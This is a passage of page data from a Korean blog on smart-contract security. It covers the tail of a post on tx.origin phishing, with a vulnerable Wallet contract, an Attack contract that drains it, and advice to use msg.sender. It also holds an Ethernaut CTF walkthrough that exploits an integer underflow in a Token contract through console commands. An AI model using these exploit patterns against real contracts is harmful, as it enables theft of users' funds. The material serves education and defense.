<span class=\"token comment\">// THE BUG IS RIGHT HERE, you must use msg.sender instead of tx.origin</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        dest<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">contract Wallet {\r\n    address public owner;\r\n\r\n    constructor() payable {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function transfer(address payable _to, uint _amount) public {\r\n        require(tx.origin == owner, \"Not owner\");\r\n\r\n        (bool sent, ) = _to.call{value: _amount}(\"\");\r\n        require(sent, \"Failed to send Ether\");\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    address payable public owner;\r\n    Wallet wallet;\r\n\r\n    constructor(Wallet _wallet) {\r\n        wallet = Wallet(_wallet);\r\n        owner = payable(msg.sender);\r\n    }\r\n\r\n    function attack() public {\r\n        wallet.transfer(owner, address(wallet).balance);\r\n    }\r\n}</code></pre></div>\n<p>시나리오는 이렇다.</p>\n<ol>\n<li>A가 10 Ether와 함께 Wallet contract를 배포한다.</li>\n<li>B가 Attack contract를 Wallet contract의 주소와 함꼐 배포한다.</li>\n<li>A가 Attack contract의 attack()을 call한다.</li>\n<li>B는 Alice의 Ether를 다 가져오게 된다.</li>\n</ol>\n<p>“누가 속아서 attack()을 call해!” 할 수 있지만 충분히 일어날 수 있다고 생각된다.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<p>solidity docs에서도 tx.origin을 authorization 사용하지 않을 것을 권장하고 있다. 또한 tx.origin은 사라질 수도 있다고 한다! 그러니 앞으로 msg.sender를 사용하도록 하자</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Besides the issue with authorization, there is a chance that tx.origin will be removed from the Ethereum protocol in the future, so code that uses tx.origin won't be compatible with future releases Vitalik: 'Do NOT assume that tx.origin will continue to be usable or meaningful.'</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>정말 간단하게 고칠 수 있는 부분이라고 생각이 든다. 그리고 동시에 이런 사소한 실 수 하나가 큰 영향을 미칠 수 있다는 것이 놀랍다. 앞으로 tx.origin 말고 msg.sender를 꼭 사용하자!!!</p>\n<h3 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h3>\n<ul>\n<li><a href=\"https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9\">https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9</a></li>\n<li><a href=\"https://solidity-by-example.org/hacks/phishing-with-tx-origin/\">https://solidity-by-example.org/hacks/phishing-with-tx-origin/</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/v0.8.10/security-considerations.html\">https://docs.soliditylang.org/en/v0.8.10/security-considerations.html</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#txorigin-vs-msgsender\">txorigin vs msg.sender</a></p>\n</li>\n<li>\n<p><a href=\"#example-code\">Example Code</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n<ul>\n<li><a href=\"#reference\">Reference</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 03, 2022","title":"(취약점 시리즈 8) tx.origin","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/vulnerability/tx.origin/tx_origin/"}},"prev":{"id":"a1fe8ee0-2157-5d19-bdf1-cbe8db94070d","html":"<h1 id=\"-1-token\" style=\"position:relative;\"><a href=\"#-1-token\" aria-label=\" 1 token permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 1. Token</h1>\n<p><strong>Difficulty 3/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>additional token 가져오기(해킹해서 가져오기)</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\r\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Token</span> <span class=\"token punctuation\">{</span>\r\n    \r\n    <span class=\"token comment\">// address와 balance의 mapping</span>\r\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> balances<span class=\"token punctuation\">;</span>\r\n    <span class=\"token comment\">// 토큰의 총 공급량</span>\r\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> totalSupply<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// constructor: 총 공급량을 parameter로 한다.</span>\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">// deployer의 balance를 총 공급량과 같게한다.</span>\r\n        <span class=\"token comment\">// totalSupply를 patameter의 총 공급량과 같이한다.</span>\r\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> totalSupply <span class=\"token operator\">=</span> _initialSupply<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    <span class=\"token comment\">// Token을 transfer하는 function이다.</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">// 만약 msg.sender의 (balance - 보내고싶은 토큰의 양)이 0과 같거나 커야한다. </span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> _value <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token comment\">// msg.sender의 잔고에서 보낼 토큰의 양을 뺀다.</span>\r\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _value<span class=\"token punctuation\">;</span>\r\n        <span class=\"token comment\">// 수신자의 잔고에 받을 토큰의 양을 더한다. </span>\r\n        balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> _value<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    <span class=\"token comment\">// 하나의 address의 balance를 확인 할 수 있는 view function</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">// return balance of an address</span>\r\n        <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>_owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h3 id=\"풀이를-위한-setup\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4%EB%A5%BC-%EC%9C%84%ED%95%9C-setup\" aria-label=\"풀이를 위한 setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이를 위한 Setup</h3>\n<p><a href=\"https://remix.ethereum.org\">RemixIDE</a>를 사용한다.\r\nremix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!\r\n그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.</p>\n<p>한 가지 주의할 점은 CoinFlip은 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.\r\n또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 “Injected Web3”를 선택해주어야 한다.</p>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제에서 우리는 기본적으로 주어진 20 토큰 이외에 추가적인 토큰을 얻으면 승리한다.</p>\n<p>가장 먼저 우리는 코드에 허점을 찾아야 한다. 하지만 지금까지와 문제와 다르게 그러나있는 허점이 없다. <del>이제야 해킹같네ㅎㅋㅎㅋㅎㅋ</del></p>\n<p>우선 내가 공부했던 취약점들을 생각해봤다. 그러던 중 token contract의 solidity compiler version은 0.6.0를 확인했다.</p>\n<p>Overflow &#x26; Underflow는 꾸준히 이슈가 되다가 0.8.0 version에서부터 알아서 처리될 수 있도록 바뀌었다. Overflow &#x26; Underflow에 관해서는 <strong><a href=\"https://holyhansss.github.io/vulnerability/over_under_flow/over_under_flow/\">이 글</a></strong> 에서 찾아볼수 있다.</p>\n<p>우리는 이제 이 문제에서 underflow를 활용해 contract에 attack할 수 있다는 것을 알 수 있다.</p>\n<p><strong>바로 Token.transfer()에 가지고 있는 token보다 큰 수를 보내면 나의 token balance가 underflow를 일으키며 상상할 수도 없는 큰 숫자의 token을 가질 수 있게 된다. 이제 코드를 보도록 하자!</strong></p>\n<p>모든 코드는 console창에서 이루어진다.\r\nctrl + shift + i를 눌러 console창을 활성화 시키자</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 나의 balance를 확인한다: 20개의 Token을 가지고 있을 것이다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// contract의 transfer()를 call한다.</span>\r\n<span class=\"token comment\">// 주소는 metamask를 통해 새로운 주소를 하나 만들었다.</span>\r\n<span class=\"token comment\">// 내가 가진 토큰의 수 보다 큰 수의 토큰을 보낸다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x690A732BA98fcfe72bDedE2085816BCF6498058d\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// 다시 나의 balance를 확인해보면 엄청 큰 수의 토큰을 얻을 것을 확인 할 수 있다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">)</span></code></pre></div>\n<p>완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>overflow와 underflow는 이미 공부했던 취약점이어서 쉽게 해결 할 수 있었다. 빠르게 6도 ㄱㄱ 해봅시다~~</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>overflow &#x26; underflow 취약점: <a href=\"https://holyhansss.github.io/vulnerability/over_under_flow/over_under_flow\">https://holyhansss.github.io/vulnerability/over_under_flow/over_under_flow</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></p>\n<ul>\n<li><a href=\"#%ED%92%80%EC%9D%B4%EB%A5%BC-%EC%9C%84%ED%95%9C-setup\">풀이를 위한 Setup</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">기타 정보</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 07, 2022","title":"(Ethernaut 취약점 5) Token","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/5_token_ethernaut/5_token_ethernaut/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/ethernaut/3_coinFilp_ethernaut/3_coinFlip_ethernaut/","nextSlug":"/vulnerability/tx.origin/tx_origin/","prevSlug":"/ethernaut/5_token_ethernaut/5_token_ethernaut/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}